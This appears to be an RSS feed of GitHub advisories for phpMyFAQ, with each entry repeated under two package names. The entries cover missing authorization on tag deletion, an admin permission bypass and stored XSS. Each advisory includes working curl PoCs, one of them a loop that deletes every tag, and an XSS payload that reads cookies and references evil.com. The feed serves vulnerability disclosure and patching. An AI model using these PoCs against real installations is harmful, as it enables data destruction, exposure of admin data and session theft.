<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2026-05-06T20:14:53.340Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[thorsten/phpmyfaq] phpMyFAQ's Missing Authorization on Tag Deletion Allows Any Authenticated User to Delete Tags]]></title>
        <id>https://github.com/advisories/GHSA-7cx3-2qx2-3g6w</id>
        <link href="https://github.com/advisories/GHSA-7cx3-2qx2-3g6w"/>
        <updated>2026-05-06T20:12:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>TagController::delete()</code> endpoint at <code>DELETE /admin/api/content/tags/{tagId}</code> only verifies that the user is logged in (<code>userIsAuthenticated()</code>), but does not check any permission. Any authenticated user — including regular non-admin frontend users — can delete any tag by ID. This contrasts with <code>TagController::update()</code> and <code>TagController::search()</code>, which both enforce the <code>FAQ_EDIT</code> permission.</p>
<h2 id="details">Details</h2>
<p>In <code>phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/TagController.php</code>, the <code>delete()</code> method (line 121-133) uses only <code>$this-&gt;userIsAuthenticated()</code>:</p>
<pre><code class="language-php">#[Route(path: 'content/tags/{tagId}', name: 'admin.api.content.tags.id', methods: ['DELETE'])]
public function delete(Request $request): JsonResponse
{
    $this-&gt;userIsAuthenticated();  // Only checks isLoggedIn() — no permission check

    $tagId = (int) Filter::filterVar($request-&gt;attributes-&gt;get('tagId'), FILTER_VALIDATE_INT);

    if ($this-&gt;tags-&gt;delete($tagId)) {
        return $this-&gt;json(['success' =&gt; Translation::get(key: 'ad_tag_delete_success')], Response::HTTP_OK);
    }

    return $this-&gt;json(['error' =&gt; Translation::get(key: 'ad_tag_delete_error')], Response::HTTP_BAD_REQUEST);
}
</code></pre>
<p>Compare with <code>update()</code> (line 48-71) which properly enforces authorization:</p>
<pre><code class="language-php">public function update(Request $request): JsonResponse
{
    $this-&gt;userHasPermission(PermissionType::FAQ_EDIT);  // Proper permission check
    // ... also verifies CSRF token ...
}
</code></pre>
<p>The <code>userIsAuthenticated()</code> method in <code>AbstractController</code> (line 258-263) only checks <code>$this-&gt;currentUser-&gt;isLoggedIn()</code>:</p>
<pre><code class="language-php">protected function userIsAuthenticated(): void
{
    if (!$this-&gt;currentUser-&gt;isLoggedIn()) {
        throw new UnauthorizedHttpException(challenge: 'User is not authenticated.');
    }
}
</code></pre>
<p>There is no admin-level middleware in the <code>Kernel</code> — it registers only RouterListener, LanguageListener, ControllerContainerListener, and exception listeners. The admin API entry point (<code>admin/api/index.php</code>) shares the same bootstrap and session as the frontend, meaning a frontend user's session cookie is valid for admin API requests.</p>
<p>Additionally, this endpoint lacks CSRF token verification (unlike <code>update()</code>), though the primary issue is the missing authorization since the attack vector is a logged-in user acting directly.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Step 1: Register as a regular user on the phpMyFAQ frontend
# (or use any existing non-admin authenticated session)

# Step 2: As the authenticated non-admin user, delete tag with ID 1:
curl -X DELETE 'https://target.com/admin/api/content/tags/1' \
  -H 'Cookie: PHPSESSID=&lt;regular_user_session&gt;'

# Expected: 401 or 403 (user lacks FAQ_EDIT permission)
# Actual: 200 OK with {"success": "..."}

# Step 3: Enumerate and delete all tags:
for i in $(seq 1 100); do
  curl -s -X DELETE "https://target.com/admin/api/content/tags/$i" \
    -H 'Cookie: PHPSESSID=&lt;regular_user_session&gt;'
done
</code></pre>
<h2 id="impact">Impact</h2>
<p>Any authenticated user (including regular frontend users who registered through the public registration form) can delete all tags in the phpMyFAQ instance. This results in:</p>
<ul>
<li><strong>Data integrity loss:</strong> Tags are permanently deleted from the database. All FAQ-to-tag associations are destroyed.</li>
<li><strong>Disruption of FAQ organization:</strong> Tag-based navigation, filtering, and tag clouds become empty or broken.</li>
<li><strong>No recoverability without backup:</strong> Deleted tags and their associations cannot be restored without a database backup.</li>
</ul>
<p>The impact is limited to tags (not FAQ content itself), but in large installations with extensive tag taxonomies, this could significantly degrade usability.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add the <code>FAQ_EDIT</code> permission check and CSRF token verification to <code>TagController::delete()</code>, consistent with <code>TagController::update()</code>:</p>
<pre><code class="language-php">#[Route(path: 'content/tags/{tagId}', name: 'admin.api.content.tags.id', methods: ['DELETE'])]
public function delete(Request $request): JsonResponse
{
    $this-&gt;userHasPermission(PermissionType::FAQ_EDIT);

    $tagId = (int) Filter::filterVar($request-&gt;attributes-&gt;get('tagId'), FILTER_VALIDATE_INT);

    if ($this-&gt;tags-&gt;delete($tagId)) {
        return $this-&gt;json(['success' =&gt; Translation::get(key: 'ad_tag_delete_success')], Response::HTTP_OK);
    }

    return $this-&gt;json(['error' =&gt; Translation::get(key: 'ad_tag_delete_error')], Response::HTTP_BAD_REQUEST);
}
</code></pre>
<p>At minimum, add <code>$this-&gt;userHasPermission(PermissionType::FAQ_EDIT)</code> to enforce the same authorization as the update and search endpoints. Consider also adding a dedicated <code>TAG_DELETE</code> permission type for more granular access control.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-7cx3-2qx2-3g6w">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-7cx3-2qx2-3g6w</a></li>
<li><a href="https://github.com/advisories/GHSA-7cx3-2qx2-3g6w">https://github.com/advisories/GHSA-7cx3-2qx2-3g6w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cx3-2qx2-3g6w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T20:12:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpmyfaq/phpmyfaq] phpMyFAQ's Missing Authorization on Tag Deletion Allows Any Authenticated User to Delete Tags]]></title>
        <id>https://github.com/advisories/GHSA-7cx3-2qx2-3g6w</id>
        <link href="https://github.com/advisories/GHSA-7cx3-2qx2-3g6w"/>
        <updated>2026-05-06T20:12:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>TagController::delete()</code> endpoint at <code>DELETE /admin/api/content/tags/{tagId}</code> only verifies that the user is logged in (<code>userIsAuthenticated()</code>), but does not check any permission. Any authenticated user — including regular non-admin frontend users — can delete any tag by ID. This contrasts with <code>TagController::update()</code> and <code>TagController::search()</code>, which both enforce the <code>FAQ_EDIT</code> permission.</p>
<h2 id="details">Details</h2>
<p>In <code>phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/TagController.php</code>, the <code>delete()</code> method (line 121-133) uses only <code>$this-&gt;userIsAuthenticated()</code>:</p>
<pre><code class="language-php">#[Route(path: 'content/tags/{tagId}', name: 'admin.api.content.tags.id', methods: ['DELETE'])]
public function delete(Request $request): JsonResponse
{
    $this-&gt;userIsAuthenticated();  // Only checks isLoggedIn() — no permission check

    $tagId = (int) Filter::filterVar($request-&gt;attributes-&gt;get('tagId'), FILTER_VALIDATE_INT);

    if ($this-&gt;tags-&gt;delete($tagId)) {
        return $this-&gt;json(['success' =&gt; Translation::get(key: 'ad_tag_delete_success')], Response::HTTP_OK);
    }

    return $this-&gt;json(['error' =&gt; Translation::get(key: 'ad_tag_delete_error')], Response::HTTP_BAD_REQUEST);
}
</code></pre>
<p>Compare with <code>update()</code> (line 48-71) which properly enforces authorization:</p>
<pre><code class="language-php">public function update(Request $request): JsonResponse
{
    $this-&gt;userHasPermission(PermissionType::FAQ_EDIT);  // Proper permission check
    // ... also verifies CSRF token ...
}
</code></pre>
<p>The <code>userIsAuthenticated()</code> method in <code>AbstractController</code> (line 258-263) only checks <code>$this-&gt;currentUser-&gt;isLoggedIn()</code>:</p>
<pre><code class="language-php">protected function userIsAuthenticated(): void
{
    if (!$this-&gt;currentUser-&gt;isLoggedIn()) {
        throw new UnauthorizedHttpException(challenge: 'User is not authenticated.');
    }
}
</code></pre>
<p>There is no admin-level middleware in the <code>Kernel</code> — it registers only RouterListener, LanguageListener, ControllerContainerListener, and exception listeners. The admin API entry point (<code>admin/api/index.php</code>) shares the same bootstrap and session as the frontend, meaning a frontend user's session cookie is valid for admin API requests.</p>
<p>Additionally, this endpoint lacks CSRF token verification (unlike <code>update()</code>), though the primary issue is the missing authorization since the attack vector is a logged-in user acting directly.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Step 1: Register as a regular user on the phpMyFAQ frontend
# (or use any existing non-admin authenticated session)

# Step 2: As the authenticated non-admin user, delete tag with ID 1:
curl -X DELETE 'https://target.com/admin/api/content/tags/1' \
  -H 'Cookie: PHPSESSID=&lt;regular_user_session&gt;'

# Expected: 401 or 403 (user lacks FAQ_EDIT permission)
# Actual: 200 OK with {"success": "..."}

# Step 3: Enumerate and delete all tags:
for i in $(seq 1 100); do
  curl -s -X DELETE "https://target.com/admin/api/content/tags/$i" \
    -H 'Cookie: PHPSESSID=&lt;regular_user_session&gt;'
done
</code></pre>
<h2 id="impact">Impact</h2>
<p>Any authenticated user (including regular frontend users who registered through the public registration form) can delete all tags in the phpMyFAQ instance. This results in:</p>
<ul>
<li><strong>Data integrity loss:</strong> Tags are permanently deleted from the database. All FAQ-to-tag associations are destroyed.</li>
<li><strong>Disruption of FAQ organization:</strong> Tag-based navigation, filtering, and tag clouds become empty or broken.</li>
<li><strong>No recoverability without backup:</strong> Deleted tags and their associations cannot be restored without a database backup.</li>
</ul>
<p>The impact is limited to tags (not FAQ content itself), but in large installations with extensive tag taxonomies, this could significantly degrade usability.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add the <code>FAQ_EDIT</code> permission check and CSRF token verification to <code>TagController::delete()</code>, consistent with <code>TagController::update()</code>:</p>
<pre><code class="language-php">#[Route(path: 'content/tags/{tagId}', name: 'admin.api.content.tags.id', methods: ['DELETE'])]
public function delete(Request $request): JsonResponse
{
    $this-&gt;userHasPermission(PermissionType::FAQ_EDIT);

    $tagId = (int) Filter::filterVar($request-&gt;attributes-&gt;get('tagId'), FILTER_VALIDATE_INT);

    if ($this-&gt;tags-&gt;delete($tagId)) {
        return $this-&gt;json(['success' =&gt; Translation::get(key: 'ad_tag_delete_success')], Response::HTTP_OK);
    }

    return $this-&gt;json(['error' =&gt; Translation::get(key: 'ad_tag_delete_error')], Response::HTTP_BAD_REQUEST);
}
</code></pre>
<p>At minimum, add <code>$this-&gt;userHasPermission(PermissionType::FAQ_EDIT)</code> to enforce the same authorization as the update and search endpoints. Consider also adding a dedicated <code>TAG_DELETE</code> permission type for more granular access control.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-7cx3-2qx2-3g6w">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-7cx3-2qx2-3g6w</a></li>
<li><a href="https://github.com/advisories/GHSA-7cx3-2qx2-3g6w">https://github.com/advisories/GHSA-7cx3-2qx2-3g6w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cx3-2qx2-3g6w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T20:12:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thorsten/phpmyfaq] phpMyFAQ has an Authorization Bypass in All Admin Pages Due to Non-Terminating Permission Check]]></title>
        <id>https://github.com/advisories/GHSA-hpgw-ww76-c68r</id>
        <link href="https://github.com/advisories/GHSA-hpgw-ww76-c68r"/>
        <updated>2026-05-06T20:11:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>AbstractAdministrationController::userHasPermission()</code> catches the <code>ForbiddenException</code> thrown when a user lacks a specific permission, sends a "forbidden" HTML page via <code>$response-&gt;send()</code>, but does not terminate execution. The calling controller method continues to execute, fetches protected data, renders the full template, and returns it as a Response. The final <code>$response-&gt;send()</code> in <code>admin/index.php</code> outputs the protected page content after the forbidden page, leaking all permission-protected admin data to any authenticated admin user regardless of their actual permissions.</p>
<h2 id="details">Details</h2>
<p>The parent class <code>AbstractController::userHasPermission()</code> (<code>phpmyfaq/src/phpMyFAQ/Controller/AbstractController.php:317-327</code>) correctly enforces authorization by throwing a <code>ForbiddenException</code> when the user lacks the required permission. This exception would normally propagate to Symfony's HttpKernel exception handler, which would return an error response and prevent the controller from continuing.</p>
<p>However, <code>AbstractAdministrationController</code> overrides this method at line 390-399:</p>
<pre><code class="language-php">#[\Override]
protected function userHasPermission(PermissionType $permissionType): void
{
    try {
        parent::userHasPermission($permissionType);
    } catch (ForbiddenException $exception) {
        $response = $this-&gt;getForbiddenPage($exception-&gt;getMessage());
        $response-&gt;send();  // Outputs HTML but does NOT terminate execution
    } catch (Exception $exception) {
        $this-&gt;configuration-&gt;getLogger()-&gt;error($exception-&gt;getMessage());
        // Only logs, no response, no termination
    }
}
</code></pre>
<p>The critical flaw: after <code>$response-&gt;send()</code> at line 396, there is no <code>exit()</code>, <code>die()</code>, <code>return</code>, or re-throw. PHP execution continues normally into the calling controller method.</p>
<p>For example, in <code>AdminLogController::index()</code> (<code>phpmyfaq/src/phpMyFAQ/Controller/Administration/AdminLogController.php:45-83</code>):</p>
<pre><code class="language-php">public function index(Request $request): Response
{
    $this-&gt;userHasPermission(PermissionType::STATISTICS_ADMINLOG);
    // ^^^ If user lacks permission: forbidden page is echoed, but execution continues

    // ... all of this still executes:
    $loggingData = $this-&gt;adminLog-&gt;getAll();  // Fetches ALL admin log entries
    // ...
    return $this-&gt;render('@admin/statistics/admin-log.twig', [
        // ... full admin log data including IPs, usernames, actions
        'loggingData' =&gt; $currentItems,
    ]);
}
</code></pre>
<p>The entry point <code>admin/index.php</code> then calls <code>$response-&gt;send()</code> on the returned Response, appending the full protected page to the already-sent forbidden page in the HTTP response body.</p>
<p>The second <code>catch</code> block (line 397-398) for generic <code>Exception</code> is even worse — it only logs the error without sending any response or terminating, so the protected page renders with no forbidden notice at all.</p>
<p><strong>58 admin controllers</strong> extend <code>AbstractAdministrationController</code> and call <code>userHasPermission()</code>, meaning every permission-protected admin page is affected. This includes:</p>
<ul>
<li>Admin logs (user IPs, actions, usernames)</li>
<li>User management (user data, permissions)</li>
<li>System information (server configuration, PHP info)</li>
<li>Configuration pages (all application settings)</li>
<li>Backup pages</li>
<li>All other admin functionality</li>
</ul>
<h2 id="poc">PoC</h2>
<ol>
<li><p>Create a test admin user with minimal permissions (e.g., only FAQ editing, no statistics access):</p>
</li>
<li><p>Authenticate as the limited admin user and request a permission-protected page:</p>
</li>
</ol>
<pre><code class="language-bash"># Get admin session cookies by logging in
curl -c cookies.txt -d 'faqusername=limited_admin&amp;faqpassword=password&amp;pmf-csrf-token=TOKEN' \
  'https://TARGET/admin/?action=login'

# Access admin log page (requires STATISTICS_ADMINLOG permission)
curl -b cookies.txt -s 'https://TARGET/admin/statistics/admin-log' | tee response.html

# The response contains BOTH the forbidden page HTML AND the full admin log:
grep -c 'You are not allowed' response.html    # 1 — forbidden page was sent
grep -c 'loggingData\|ad_adminlog_ip' response.html  # matches — admin log data also present

# Access system information (requires CONFIGURATION_EDIT permission)  
curl -b cookies.txt -s 'https://TARGET/admin/system-information' | tee sysinfo.html
# Contains PHP version, extensions, database info, server configuration
</code></pre>
<ol start="3">
<li>The HTTP response body contains the forbidden page HTML followed by the full protected page HTML, including all sensitive data.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>Any authenticated admin user — even one with zero administrative permissions beyond basic login — can access <strong>every</strong> permission-protected admin page by simply requesting its URL. The permission check sends a forbidden page but does not stop execution, so the protected content is always appended to the response.</p>
<p>Exposed data includes:</p>
<ul>
<li><strong>Admin logs</strong>: All admin users' IP addresses, actions, and timestamps</li>
<li><strong>User management</strong>: User accounts, email addresses, permissions</li>
<li><strong>System information</strong>: PHP configuration, database details, server paths</li>
<li><strong>Configuration</strong>: All application settings including security-sensitive values</li>
<li><strong>Backups</strong>: Database export functionality</li>
</ul>
<p>This effectively renders the entire admin permission system non-functional for the 58 page controllers using <code>AbstractAdministrationController</code>.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add <code>return</code> after sending the forbidden response, and re-throw for the generic Exception case:</p>
<pre><code class="language-php">#[\Override]
protected function userHasPermission(PermissionType $permissionType): void
{
    try {
        parent::userHasPermission($permissionType);
    } catch (ForbiddenException $exception) {
        $response = $this-&gt;getForbiddenPage($exception-&gt;getMessage());
        $response-&gt;send();
        exit;  // Terminate execution to prevent controller from continuing
    } catch (Exception $exception) {
        $this-&gt;configuration-&gt;getLogger()-&gt;error($exception-&gt;getMessage());
        throw $exception;  // Re-throw to prevent controller from continuing
    }
}
</code></pre>
<p>A cleaner architectural fix would be to not swallow the exception at all, and instead let it propagate to the Symfony HttpKernel exception handler (which already handles <code>ForbiddenException</code> via <code>WebExceptionListener</code>):</p>
<pre><code class="language-php">#[\Override]
protected function userHasPermission(PermissionType $permissionType): void
{
    // Simply delegate to parent — let ForbiddenException propagate
    // to the WebExceptionListener which renders the appropriate error page
    parent::userHasPermission($permissionType);
}
</code></pre>
<p>Or remove the override entirely, since the <code>WebExceptionListener</code> registered in the Kernel already handles exception-to-response conversion.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-hpgw-ww76-c68r">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-hpgw-ww76-c68r</a></li>
<li><a href="https://github.com/advisories/GHSA-hpgw-ww76-c68r">https://github.com/advisories/GHSA-hpgw-ww76-c68r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpgw-ww76-c68r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T20:11:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpmyfaq/phpmyfaq] phpMyFAQ has an Authorization Bypass in All Admin Pages Due to Non-Terminating Permission Check]]></title>
        <id>https://github.com/advisories/GHSA-hpgw-ww76-c68r</id>
        <link href="https://github.com/advisories/GHSA-hpgw-ww76-c68r"/>
        <updated>2026-05-06T20:11:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>AbstractAdministrationController::userHasPermission()</code> catches the <code>ForbiddenException</code> thrown when a user lacks a specific permission, sends a "forbidden" HTML page via <code>$response-&gt;send()</code>, but does not terminate execution. The calling controller method continues to execute, fetches protected data, renders the full template, and returns it as a Response. The final <code>$response-&gt;send()</code> in <code>admin/index.php</code> outputs the protected page content after the forbidden page, leaking all permission-protected admin data to any authenticated admin user regardless of their actual permissions.</p>
<h2 id="details">Details</h2>
<p>The parent class <code>AbstractController::userHasPermission()</code> (<code>phpmyfaq/src/phpMyFAQ/Controller/AbstractController.php:317-327</code>) correctly enforces authorization by throwing a <code>ForbiddenException</code> when the user lacks the required permission. This exception would normally propagate to Symfony's HttpKernel exception handler, which would return an error response and prevent the controller from continuing.</p>
<p>However, <code>AbstractAdministrationController</code> overrides this method at line 390-399:</p>
<pre><code class="language-php">#[\Override]
protected function userHasPermission(PermissionType $permissionType): void
{
    try {
        parent::userHasPermission($permissionType);
    } catch (ForbiddenException $exception) {
        $response = $this-&gt;getForbiddenPage($exception-&gt;getMessage());
        $response-&gt;send();  // Outputs HTML but does NOT terminate execution
    } catch (Exception $exception) {
        $this-&gt;configuration-&gt;getLogger()-&gt;error($exception-&gt;getMessage());
        // Only logs, no response, no termination
    }
}
</code></pre>
<p>The critical flaw: after <code>$response-&gt;send()</code> at line 396, there is no <code>exit()</code>, <code>die()</code>, <code>return</code>, or re-throw. PHP execution continues normally into the calling controller method.</p>
<p>For example, in <code>AdminLogController::index()</code> (<code>phpmyfaq/src/phpMyFAQ/Controller/Administration/AdminLogController.php:45-83</code>):</p>
<pre><code class="language-php">public function index(Request $request): Response
{
    $this-&gt;userHasPermission(PermissionType::STATISTICS_ADMINLOG);
    // ^^^ If user lacks permission: forbidden page is echoed, but execution continues

    // ... all of this still executes:
    $loggingData = $this-&gt;adminLog-&gt;getAll();  // Fetches ALL admin log entries
    // ...
    return $this-&gt;render('@admin/statistics/admin-log.twig', [
        // ... full admin log data including IPs, usernames, actions
        'loggingData' =&gt; $currentItems,
    ]);
}
</code></pre>
<p>The entry point <code>admin/index.php</code> then calls <code>$response-&gt;send()</code> on the returned Response, appending the full protected page to the already-sent forbidden page in the HTTP response body.</p>
<p>The second <code>catch</code> block (line 397-398) for generic <code>Exception</code> is even worse — it only logs the error without sending any response or terminating, so the protected page renders with no forbidden notice at all.</p>
<p><strong>58 admin controllers</strong> extend <code>AbstractAdministrationController</code> and call <code>userHasPermission()</code>, meaning every permission-protected admin page is affected. This includes:</p>
<ul>
<li>Admin logs (user IPs, actions, usernames)</li>
<li>User management (user data, permissions)</li>
<li>System information (server configuration, PHP info)</li>
<li>Configuration pages (all application settings)</li>
<li>Backup pages</li>
<li>All other admin functionality</li>
</ul>
<h2 id="poc">PoC</h2>
<ol>
<li><p>Create a test admin user with minimal permissions (e.g., only FAQ editing, no statistics access):</p>
</li>
<li><p>Authenticate as the limited admin user and request a permission-protected page:</p>
</li>
</ol>
<pre><code class="language-bash"># Get admin session cookies by logging in
curl -c cookies.txt -d 'faqusername=limited_admin&amp;faqpassword=password&amp;pmf-csrf-token=TOKEN' \
  'https://TARGET/admin/?action=login'

# Access admin log page (requires STATISTICS_ADMINLOG permission)
curl -b cookies.txt -s 'https://TARGET/admin/statistics/admin-log' | tee response.html

# The response contains BOTH the forbidden page HTML AND the full admin log:
grep -c 'You are not allowed' response.html    # 1 — forbidden page was sent
grep -c 'loggingData\|ad_adminlog_ip' response.html  # matches — admin log data also present

# Access system information (requires CONFIGURATION_EDIT permission)  
curl -b cookies.txt -s 'https://TARGET/admin/system-information' | tee sysinfo.html
# Contains PHP version, extensions, database info, server configuration
</code></pre>
<ol start="3">
<li>The HTTP response body contains the forbidden page HTML followed by the full protected page HTML, including all sensitive data.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>Any authenticated admin user — even one with zero administrative permissions beyond basic login — can access <strong>every</strong> permission-protected admin page by simply requesting its URL. The permission check sends a forbidden page but does not stop execution, so the protected content is always appended to the response.</p>
<p>Exposed data includes:</p>
<ul>
<li><strong>Admin logs</strong>: All admin users' IP addresses, actions, and timestamps</li>
<li><strong>User management</strong>: User accounts, email addresses, permissions</li>
<li><strong>System information</strong>: PHP configuration, database details, server paths</li>
<li><strong>Configuration</strong>: All application settings including security-sensitive values</li>
<li><strong>Backups</strong>: Database export functionality</li>
</ul>
<p>This effectively renders the entire admin permission system non-functional for the 58 page controllers using <code>AbstractAdministrationController</code>.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add <code>return</code> after sending the forbidden response, and re-throw for the generic Exception case:</p>
<pre><code class="language-php">#[\Override]
protected function userHasPermission(PermissionType $permissionType): void
{
    try {
        parent::userHasPermission($permissionType);
    } catch (ForbiddenException $exception) {
        $response = $this-&gt;getForbiddenPage($exception-&gt;getMessage());
        $response-&gt;send();
        exit;  // Terminate execution to prevent controller from continuing
    } catch (Exception $exception) {
        $this-&gt;configuration-&gt;getLogger()-&gt;error($exception-&gt;getMessage());
        throw $exception;  // Re-throw to prevent controller from continuing
    }
}
</code></pre>
<p>A cleaner architectural fix would be to not swallow the exception at all, and instead let it propagate to the Symfony HttpKernel exception handler (which already handles <code>ForbiddenException</code> via <code>WebExceptionListener</code>):</p>
<pre><code class="language-php">#[\Override]
protected function userHasPermission(PermissionType $permissionType): void
{
    // Simply delegate to parent — let ForbiddenException propagate
    // to the WebExceptionListener which renders the appropriate error page
    parent::userHasPermission($permissionType);
}
</code></pre>
<p>Or remove the override entirely, since the <code>WebExceptionListener</code> registered in the Kernel already handles exception-to-response conversion.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-hpgw-ww76-c68r">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-hpgw-ww76-c68r</a></li>
<li><a href="https://github.com/advisories/GHSA-hpgw-ww76-c68r">https://github.com/advisories/GHSA-hpgw-ww76-c68r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpgw-ww76-c68r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T20:11:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpmyfaq/phpmyfaq] phpMyFAQ has stored XSS via Utils::parseUrl() in comment rendering]]></title>
        <id>https://github.com/advisories/GHSA-9525-27vj-c8r8</id>
        <link href="https://github.com/advisories/GHSA-9525-27vj-c8r8"/>
        <updated>2026-05-06T20:10:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored XSS vulnerability in the comment rendering pipeline allows an authenticated user to inject JavaScript that executes for every visitor of an affected FAQ or News page. An attacker with a registered account can steal admin session cookies and take over the application.</p>
<h3 id="details">Details</h3>
<p><code>Utils::parseUrl()</code> (<code>phpmyfaq/src/phpMyFAQ/Utils.php</code>, line 281) converts URLs in comment text into clickable <code>&lt;a&gt;</code> tags at render time:</p>
<pre><code>$pattern = '/(https?:\/\/[^\s]+)/i';
$replacement = '&lt;a href="$1"&gt;$1&lt;/a&gt;';
return preg_replace($pattern, $replacement, $string);
</code></pre>
<p>The regex <code>[^\s]+</code> matches <code>"</code> and <code>&lt;</code>, and the URL is inserted into the href attribute with no htmlspecialchars() call. A URL with a literal <code>"</code> closes the attribute early and allows injecting event handlers like onmouseover.</p>
<p>This only reaches the sink when <code>main.enableCommentEditor</code> is enabled. In that path, comment text goes through <code>sanitizeHtmlComment()</code> instead of <code>FILTER_SANITIZE_SPECIAL_CHARS</code> — which encodes <code>"</code> — so the double-quote survives to storage. The comment is then passed through parseUrl() and rendered via <code>{{ comment.comment|raw }}</code> in <code>comment.macros.twig</code> (line 40), which disables Twig auto-escaping.</p>
<p>The same sink exists in the admin comment panel (<code>admin/content/comments.twig</code>, lines 62 and 112), so admins viewing the panel are also affected.</p>
<p>No Content-Security-Policy headers are set anywhere in the app.</p>
<h3 id="poc">PoC</h3>
<p>Requirements:</p>
<ul>
<li>main.enableCommentEditor = true (set in admin Configuration panel)</li>
<li>attacker has any registered user account</li>
<li>one FAQ entry with comments allowed exists</li>
</ul>
<p>Steps:</p>
<ol>
<li><p>Log in as a registered user and open a FAQ with comments.</p>
</li>
<li><p>Submit the following as the comment text:</p>
<pre><code>https://www.evil.com/"onmouseover="alert(document.cookie)
</code></pre>
<p>(www. prefix required — parseUrl strips https:// then only re-adds
it for www. URLs, which is what triggers the linkification)</p>
</li>
<li><p>Any user who views that FAQ page and hovers the link triggers the
payload. To hit an admin, wait for them to visit the page or check
the admin comments panel at /admin/content/comments.</p>
</li>
</ol>
<p>Resulting HTML in the page:</p>
<pre><code>&lt;a href="https://www.evil.com/"onmouseover="alert(document.cookie)"&gt;
  ...
&lt;/a&gt;
</code></pre>
<p>The <code>"</code> closes the href attribute; onmouseover becomes a real attribute.</p>
<h3 id="impact">Impact</h3>
<p>Stored XSS affecting all visitors of the page, including admins. Session cookie theft leads to full admin account takeover. The payload looks like a normal URL and persists until manually deleted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9525-27vj-c8r8">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9525-27vj-c8r8</a></li>
<li><a href="https://github.com/advisories/GHSA-9525-27vj-c8r8">https://github.com/advisories/GHSA-9525-27vj-c8r8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9525-27vj-c8r8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T20:10:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thorsten/phpmyfaq] phpMyFAQ has stored XSS via Utils::parseUrl() in comment rendering]]></title>
        <id>https://github.com/advisories/GHSA-9525-27vj-c8r8</id>
        <link href="https://github.com/advisories/GHSA-9525-27vj-c8r8"/>
        <updated>2026-05-06T20:10:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored XSS vulnerability in the comment rendering pipeline allows an authenticated user to inject JavaScript that executes for every visitor of an affected FAQ or News page. An attacker with a registered account can steal admin session cookies and take over the application.</p>
<h3 id="details">Details</h3>
<p><code>Utils::parseUrl()</code> (<code>phpmyfaq/src/phpMyFAQ/Utils.php</code>, line 281) converts URLs in comment text into clickable <code>&lt;a&gt;</code> tags at render time:</p>
<pre><code>$pattern = '/(https?:\/\/[^\s]+)/i';
$replacement = '&lt;a href="$1"&gt;$1&lt;/a&gt;';
return preg_replace($pattern, $replacement, $string);
</code></pre>
<p>The regex <code>[^\s]+</code> matches <code>"</code> and <code>&lt;</code>, and the URL is inserted into the href attribute with no htmlspecialchars() call. A URL with a literal <code>"</code> closes the attribute early and allows injecting event handlers like onmouseover.</p>
